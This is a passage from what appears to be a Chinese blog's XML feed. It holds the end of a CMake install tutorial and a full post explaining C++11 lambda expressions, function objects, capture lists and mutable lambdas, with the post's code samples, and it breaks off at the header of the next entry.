安装工程，通过--prefix选项来指定安装的前缀</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake --install . --prefix <span class="string">&quot;/home/nino/cmake_tutorial/Tutorial4/dist&quot;</span></span></span><br></pre></td></tr></table></figure><p>在本地测试的时候，输入以上命令的结果如下：<br><img src="14.png"></p><p>同时查看我们的安装目录：<br><img src="15.png"></p><p>一切正常，安装成功！</p><hr><blockquote><p>参考资料：<em>CMake官方文档</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 PL 的角度深入剖析 C++11 中的 lambda 表达式（我以为我懂了系列！）</title>
      <link href="/2021/10/21/cpp-lamba/"/>
      <url>/2021/10/21/cpp-lamba/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在使用 C++11 的标准库算法的时候，常常需要传入一个<strong>可调用对象</strong>作为实参，那么到底什么是可调用对象呢？从语法层次来说，能够使用调用运算符（）的对象就是可调用对象，即若 obj 是一个可调用对象，那么语法 <code>obj([arg])</code> 是合法的。C++11 提供了四种可调用的对象，其中我们用的最多的就是<strong>函数</strong>和<strong>函数指针</strong>；通过对类重载函数运算符，该类的对象也是一种可调用对象；还有一种可调用对象就是 lambda 表达式。</p><hr><h1 id="重载函数调用运算符的类"><a href="#重载函数调用运算符的类" class="headerlink" title="重载函数调用运算符的类"></a>重载函数调用运算符的类</h1><p>如果一个类重载了函数调用运算符，则该类的对象称为<strong>函数对象</strong>，我们则可以像使用函数调用一样使用该类的对象。注意，重载的函数调用运算符仍然是一个类的成员函数，在其函数体中，依旧可以访问到类的其他成员变量，这使得其与普通函数有了很大的区别，普通函数仅仅能访问通过函数实参传递的值，但是类中重载的函数调用运算符却可以访问类的其他成员，这无疑使得其功能比其普通函数更强大。因为这样的类可以同时<font color=red>存储状态</font>，所以与普通函数相比它们更灵活。</p><p>考虑一种情形，我们需要给用户提供一个接口，用户输入一个保存着若干 string 对象的 vector 对象，我们给用户打印出其中所有的 string，并且用户可以指定自己的流和分隔符。如果我们通过一个函数来实现这个功能，有两种方式来实现，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************ 第一种实现方式, 接受三个实参 ************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> vector&lt;string&gt; &amp;vs, ostream &amp;os = cout, <span class="keyword">char</span> sep = <span class="string">&#x27; &#x27;</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;s : vs)</span><br><span class="line">        os &lt;&lt; s &lt;&lt; sep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************ 第二种实现方式, 用全局变量保存状态 ************************/</span></span><br><span class="line"><span class="keyword">static</span> ostream &amp;os = cout;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> sep = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> vector&lt;string&gt; &amp;vs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;s : vs)</span><br><span class="line">        os &lt;&lt; s &lt;&lt; sep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于第一种实现方式，用户在每次调用的时候如果想使用自己的输出流和分隔符，都必须显示的指定，<strong>增加了使用接口的复杂性</strong>；而对于第二种方式，输出流和分隔符定义为全局变量，<strong>会破坏代码的封装性</strong>，甚至可能引入不必要的麻烦。这时候，函数对象的作用就派上用场了，我们可以定义一个类如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrintString</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">PrintString</span>(ostream &amp;o = cout, <span class="keyword">char</span> c = <span class="string">&#x27; &#x27;</span>) : <span class="built_in">os</span>(o), <span class="built_in">sep</span>(c) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> vector&lt;string&gt; &amp;vs)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;s : vs)</span><br><span class="line">            os &lt;&lt; s &lt;&lt; sep;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    ostream &amp;os;</span><br><span class="line">    <span class="keyword">char</span> sep;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">PrintString <span class="title">print</span><span class="params">(cerr, <span class="string">&#x27;\n&#x27;</span>)</span></span>;</span><br><span class="line"><span class="built_in">print</span>(myVec);</span><br></pre></td></tr></table></figure><p>这样，用户每次在使用前只需要先定义一个对象，再直接通过该对象来调用接口打印即可，可以注意到，仅仅需要定义一次对象，在初始化的时候指定输出流和分隔符，用户就可以方便的使用接口，通过类的封装性，将状态保存在了类中，将上述两种方式的优点都结合在了一起。</p><hr><h1 id="使用-lambda-表达式定义临时函数对象"><a href="#使用-lambda-表达式定义临时函数对象" class="headerlink" title="使用 lambda 表达式定义临时函数对象"></a>使用 lambda 表达式定义临时函数对象</h1><p>什么是<strong>谓词</strong>？谓词就是一个可调用表达式，其返回结果是一个能用作条件的值。根据谓词的定义可知，返回类型为 bool 的可调用对象就是一个谓词。标准库算法使用的谓词分为两类：<strong>一元谓词</strong>，即只接受单一参数；<strong>二元谓词</strong>，即只接收两个参数。比如，函数 <code>bool isShorter(const string &amp;s1, const string &amp;s2)</code> 就是一个二元谓词。</p><h2 id="问题引入"><a href="#问题引入" class="headerlink" title="问题引入"></a>问题引入</h2><p>考虑一种情形，我们需要提供给用户一个函数，用户输入一个保存着若干 string 元素的 vector 对象和一个 string::size_type 参数， 该函数先将用户输入的 vector 按照其 string 元素的字典序排序，然后删除冗余的元素，再按照 string 元素的长度从小到大排序，同时打印出 string 元素长度大于等于用户输入的第二个参数的 string 元素，要求尽可能的使用标准库中算法。我们可以实现如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">isShorter</span><span class="params">(<span class="keyword">const</span> string &amp;s1, <span class="keyword">const</span> string &amp;s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s1.<span class="built_in">size</span>() &lt; s2.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> string &amp;s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; s &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Finder</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Finder</span>(string::size_type s = <span class="number">0</span>) : <span class="built_in">sz</span>(s) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> string &amp;a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.<span class="built_in">size</span>() &gt;= sz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string::size_type sz;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供给用户的功能函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">biggies</span><span class="params">(vector&lt;string&gt; &amp;words, string::size_type sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 通过sort函数对words中的元素按照字典序排序</span></span><br><span class="line">    <span class="built_in">sort</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">// 通过unique函数和erase成员函数删除冗余的单词</span></span><br><span class="line">    vector&lt;string&gt;::iterator end_unique = <span class="built_in">unique</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>());</span><br><span class="line">    words.<span class="built_in">erase</span>(end_unique, words.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过stable_sort函数传入用以比较两个string大小的isShorter谓词，将words按照stirng长度排序</span></span><br><span class="line">    <span class="built_in">stable_sort</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), isShorter);</span><br><span class="line">    <span class="comment">// 通过find_if函数传入一个临时函数对象Finder(sz)，找到第一个满足size()&gt;=sz的元素</span></span><br><span class="line">    <span class="keyword">auto</span> wc = <span class="built_in">find_if</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), <span class="built_in">Finder</span>(sz));</span><br><span class="line">    <span class="comment">// 通过for_each函数传入一个print谓词，打印size()&gt;=sz的元素</span></span><br><span class="line">    for_each(wc, words.<span class="built_in">end</span>(), print);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析以上的代码，我们可以发现很严重的问题，为了使用 stable_sort 和 for_each 标准库函数，我们分别定义了两个函数 isShorter 和 print，分别作用二元谓词和一元谓词传递给 stable_sort 和 for_each ，这两个函数很简短，而且仅仅被使用了一次。为了使用 find_if 标准库函数，又因为 find_if 只能接受一元谓词，这样就不能将 sz 作为参数传给某个函数来作为 find_if 的谓词，所以我们定义了一个 Finder 类，用来保存 sz 这个状态，在使用 find_if 时传入一个临时的函数对象 Finder(sz)，同样的，Finder 类只被临时使用了一次。<font color=red><strong>这就是 lambda 表达式出现的契机，用来代替这些被临时定义使用的可调用对象，我们可以把 lambda 表达式理解为一个未命名的函数，但他又不同于一般的函数，他有一个很大的特点就是可以捕获状态，但又不需要声明一个新的类来保存状态，而其实在编译器内部对 lambda 表达式的处理就是生成了一个未命名的类，并通过 lambda 表达式生成该未命名类的未命名函数对象。因此对于那些我们只要用一次的简短的函数或函数对象来说，利用 lambda 表达式能极大的增强代码的封装性和可读性。</strong></font>具体利用 lambda 改进后的代码，在以下概述其用法后给出。</p><h2 id="ambda-表达式"><a href="#ambda-表达式" class="headerlink" title="ambda 表达式"></a>ambda 表达式</h2><p>一个 lambda 表达式表示一个可调用的代码单元，我们可以先将其理解为一个未命名的内联函数。与普通函数相似，一个 lambda 具有一个返回类型、一个参数列表和一个函数体，但与函数不同，<strong>lambda 可以定义在函数的内部</strong>。lambda 表达式的形式如下：<br>                                <center> <strong>[<em>capture list</em>] (<em>parameter list</em>)  $\rightarrow$ <em>return type</em> {<em>function body</em> }</strong></center></p><p>其中，capture list 是一个 lambda 所在函数中所捕获的<strong>局部变量</strong>列表，其标识了一个 lambda 表达式的开始，是不可省略的；return type 、parameter list 和 function body 和任何普通函数一样，分别表示返回类型、参数列表和函数体，与普通函数不同之处在于 lambda 必须使用 C++11 中的尾置返回来指定返回类型。但是<strong>我们可以忽略参数列表和返回类型，忽略参数列表则相当于指定一个空参数列表，忽略返回类型，lambda 根据函数体中的代码推断出返回类型</strong>。注意，与普通函数不同的一点是 lambda 不能有默认参数。例如，我们可以定义一个不接受任何实参且返回值为空的 lambda 表达式如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> func = []&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;;</span><br><span class="line">cout &lt;&lt; <span class="built_in">func</span>(); <span class="comment">// 打印0</span></span><br></pre></td></tr></table></figure><p>根据 lambda 表达式的定义，我们可以将上述问题中的 isShorter 函数用 lambda 表达式实现，运用stable_sort 标准库函数，将 print 函数实现用于 for_each 标准库函数，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stable_sort</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), [](<span class="keyword">const</span> string &amp;s1, <span class="keyword">const</span> string &amp;s2) -&gt; <span class="keyword">bool</span></span><br><span class="line">            &#123; <span class="keyword">return</span> s1.<span class="built_in">size</span>() &lt; s2.<span class="built_in">size</span>(); &#125;);</span><br><span class="line"></span><br><span class="line">for_each(wc, words.<span class="built_in">end</span>(), [](<span class="keyword">const</span> string &amp;s)</span><br><span class="line">             &#123; cout &lt;&lt; s &lt;&lt; <span class="string">&#x27; &#x27;</span>; &#125;);</span><br></pre></td></tr></table></figure><blockquote><p>1、lambda 表达式和普通的函数有什么区别？<br>lambda 表达式可以定义在函数内部，而普通函数不行；lambda 表达式必须使用尾置返回符，而普通函数不一定；lambda 表达式可以忽略参数列表和返回类型，但普通函数不可以；lambda 表达式不可以有默认参数，但普通函数可以。</p></blockquote><h2 id="捕获列表"><a href="#捕获列表" class="headerlink" title="捕获列表"></a>捕获列表</h2><p>一个 lambda 表达式由一组中括号括起来的捕获列表标识开始，到底什么是捕获列表呢？我们可以初步将其理解为一种函数参数的传递方式，就像前面说的，将 lambda 理解为一个未命名的内联函数一样，捕获列表是其一种特殊的传递参数的方式，且其接受的参数<strong>只能是 lambda 表达式所在函数的局部非 static 变量</strong>（因为 static 变量和全部变量可以直接在 lambda 函数体中直接使用，例如上述的 cout）。类似于参数传递，变量的捕获方式可以是<strong>值捕获</strong>，<strong>但是与调用时的参数传递不一样，被捕获的变量的值是在 lambda 创建时的拷贝，而不是调用时的拷贝</strong>。如下代码（从函数的角度也许很难理解这是为什么，其实是因为 lambda 底层并不是简单的函数，具体如何，后续会通过语法树的处理方式给出）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> v1 = <span class="number">42</span>;</span><br><span class="line">    <span class="comment">// 将v1采用值捕获的方式拷贝到名为f的可调用对象</span></span><br><span class="line">    <span class="keyword">auto</span> f = [v1]() -&gt; <span class="keyword">unsigned</span></span><br><span class="line">    </span><br><span class="line">    &#123; <span class="keyword">return</span> v1; &#125;;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">auto</span> v2 = <span class="built_in">f</span>();<span class="comment">// v2的值是42</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，由于 lambda 表达式捕获列表的作用，我们可以将上述问题中的 Finder 类用 lambda 表达式替代，运用 find_if 标准库函数，将 Finder(sz) 保存状态的方式改为对 sz 的捕获，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> wc = <span class="built_in">find_if</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), [sz](<span class="keyword">const</span> string &amp;s) -&gt; <span class="keyword">bool</span></span><br><span class="line">&#123; <span class="keyword">return</span> s.<span class="built_in">size</span>() &gt;= sz; &#125;);</span><br></pre></td></tr></table></figure><p>通过 lambda 表达式，我们的 biggies 函数就无需再定义其他的函数和类了，极大的增强了代码的封装性，也更加清晰可读，其最终版实现如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">biggies</span><span class="params">(vector&lt;string&gt; &amp;words, string::size_type sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 通过sort函数对words中的元素按照字典序排序</span></span><br><span class="line">    <span class="built_in">sort</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">// 通过unique函数和erase成员函数删除冗余的单词</span></span><br><span class="line">    vector&lt;string&gt;::iterator end_unique = <span class="built_in">unique</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>());</span><br><span class="line">    words.<span class="built_in">erase</span>(end_unique, words.<span class="built_in">end</span>());</span><br><span class="line"><span class="comment">// 通过stable_sort函数将words按照stirng长度排序</span></span><br><span class="line">    <span class="built_in">stable_sort</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), [](<span class="keyword">const</span> string &amp;s1, <span class="keyword">const</span> string &amp;s2) -&gt; <span class="keyword">bool</span></span><br><span class="line">                &#123; <span class="keyword">return</span> s1.<span class="built_in">size</span>() &lt; s2.<span class="built_in">size</span>(); &#125;);</span><br><span class="line">    <span class="comment">// 通过find_if函数找到第一个满足size()&gt;=sz的元素</span></span><br><span class="line">    <span class="keyword">auto</span> wc = <span class="built_in">find_if</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), [sz](<span class="keyword">const</span> string &amp;s) -&gt; <span class="keyword">bool</span></span><br><span class="line">                      &#123; <span class="keyword">return</span> s.<span class="built_in">size</span>() &gt;= sz; &#125;);</span><br><span class="line"><span class="comment">// 通过for_each函数打印size()&gt;=sz的元素</span></span><br><span class="line">    for_each(wc, words.<span class="built_in">end</span>(), [](<span class="keyword">const</span> string &amp;s)</span><br><span class="line">             &#123; cout &lt;&lt; s &lt;&lt; <span class="string">&#x27; &#x27;</span>; &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样捕获的方式也可以是<strong>引用捕获</strong>。如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> v1 = <span class="number">42</span>;</span><br><span class="line">    <span class="comment">// // 将v1采用引用捕获的方式拷贝到名为f的可调用对象</span></span><br><span class="line">    <span class="keyword">auto</span> f = [&amp;v1]() -&gt; <span class="keyword">unsigned</span></span><br><span class="line">    &#123; <span class="keyword">return</span> v1; &#125;;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">auto</span> v2 = <span class="built_in">f</span>();<span class="comment">// v2 的值为0，因为上一行代码改变了v1的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值捕获就是在创建 lambda 表达式的时候进行变量的拷贝，这就要求变量可以支持拷贝操作。这就使得引用捕获是很有必要的，因为有些对象禁用了拷贝功能，只能通过引用传递，比如流对象。同时，<strong>我们必须确保被引用的对象在 lambda 执行的时候是存在的</strong>，lambda 捕获的都是局部变量，而局部变量都是在栈空间中存放，当函数结束后，这些局部变量都不复存在了，比如某种情形下，某个函数返回一个 lambda 表达式，则与函数不能返回一个局部变量的引用一样，此 lambda 也不能包含引用捕获。<br>除了显式的列出我们希望使用的来自所在函数的变量之外，还可以让编译器根据 lambda 体中的代码来推断我们要使用哪些变量，为了指示编译器推断捕获列表，应在捕获列表中写一个 &amp; 或 = 。&amp; 告诉编译器采用捕获引用方式，= 告诉编译器采用值捕获方式。例如，我们可以重写传递给 find_if 的 lambda：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find_if</span>(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), [=](<span class="keyword">const</span> string &amp;s) -&gt; <span class="keyword">bool</span></span><br><span class="line">  &#123; <span class="keyword">return</span> s.<span class="built_in">size</span>() &gt;= sz; &#125;);</span><br></pre></td></tr></table></figure><p>lambda 表达式捕获列表总共如下几种使用方式：<br><img src="1.png"></p><h2 id="可变-lambda"><a href="#可变-lambda" class="headerlink" title="可变 lambda"></a>可变 lambda</h2><p>对于值捕获的变量，lambda 在函数体中不能改变其值，如果我们希望改变一个被捕获变量的值，就必须在参数列表首加上关键字 <strong>mutable</strong>，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> v1 = <span class="number">42</span>;</span><br><span class="line">    <span class="comment">// 如果没有mutable关键字，函数体内对v1的修改将报编译错误</span></span><br><span class="line">    <span class="keyword">auto</span> f = [v1]() <span class="keyword">mutable</span> -&gt; <span class="keyword">unsigned</span></span><br><span class="line">    &#123;</span><br><span class="line">        v1++;</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">auto</span> v2 = <span class="built_in">f</span>(); <span class="comment">// v2的值为43</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="编译器到底如何处理-lambda-表达式"><a href="#编译器到底如何处理-lambda-表达式" class="headerlink" title="编译器到底如何处理 lambda 表达式"></a>编译器到底如何处理 lambda 表达式</h1><p>之前一直在说，把 lambda 表达式当成一种特殊的未命名的内联函数就好了，但实际上，其根本不是一个函数，那到底是什么呢？其实第二节的标题已经给出了答案，lambda 表达式是一个<strong>函数对象</strong>，在定义一个 lambda 表达式的时候，相当于编译器为我们定义了一个临时的类，该类重载了函数调用运算符，同时对于引用捕获的变量，编译器无须在 lambda 产生的类中将其存储为数据成员，而对于值捕获的变量，由于其需要被拷贝到 lambda 中，因此这种 lambda 产生的类就必须为每个值捕获的变量建立对应的数据成员，同时创建构造函数。若将一个变量初始化为一个 lambda 表达式，则相当于初始化了一个该临时类的对象，而在调用的时候就相当于调用了该类的函数重载运算符。例如以下程序，在 main 函数中使用的 lambda 表达式将会产生形如 A 的类：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>(<span class="keyword">int</span> a) : <span class="built_in">v1</span>(a) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> v1;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 编译器会生成一个类，类似于上面定义的类A</span></span><br><span class="line">    <span class="keyword">auto</span> f = [v1]()-&gt; <span class="keyword">int</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;;</span><br><span class="line">    v1++;</span><br><span class="line">    <span class="built_in">f</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，重载的函数调用运算符带 const 修饰，所以通过值捕获的变量不能在 lambda 表达式的函数体中被修改，同时类 A 还会定义一个数据成员来保存捕获的值，以及一个构造函数来构造其对象。我们可以通过将其在 clang 中的语法树 dump 出来：<br><img src="2.png"></p><p>可以很明显的看到，lambda 表达式生成了一个类（CXXRecordDecl结点 ），该类会有一个构造函数，以及其重载的函数调用运算符，而且带上了 <strong>const</strong> 修饰，这就是为啥在其函数体中不能修改值捕获的变量的原因。这里在函数体中其显示对 v1 变量的引用直接指向了定义 v1 的结点，我也没明白这是 clang 带来的优化还是怎么的，但是此处我特意将 ELF 文件反汇编看了，确实是生成了一个大小为 4 字节的类，然后在 lambda 表达式中对 v1 的引用也是访问的这个类对象的内存空间，也就是说明这个生成的类确实有一个数据成员用来保存 v1 的值。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以往，我们接触最多的可调用对象是<strong>函数或者函数指针</strong>；但是由于 C++ 中的类可以重载函数调用运算符，所以有了<strong>函数对象</strong>这种可调用对象；又由于在很多地方我们的代码（如标准库利用 GP 手段定义的函数）需要一个简单的函数，并且这个函数并不会在其他地方被使用，相当于我们需要一个特殊的临时函数的时候，为了增强代码的封装性，我们完全可以用 <strong>lambda 表达式</strong>这种可调用对象来替代一个新的函数定义和类的定义，此时它起的作用就相当于匿名函数。</p><hr><blockquote><p>参考资料：《C++ prime》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 编译器自动生成的函数详解</title>
      <link href="/2021/10/21/cpp-compiler-generated-func/"/>
      <url>/2021/10/21/cpp-compiler-generated-func/</url>
      
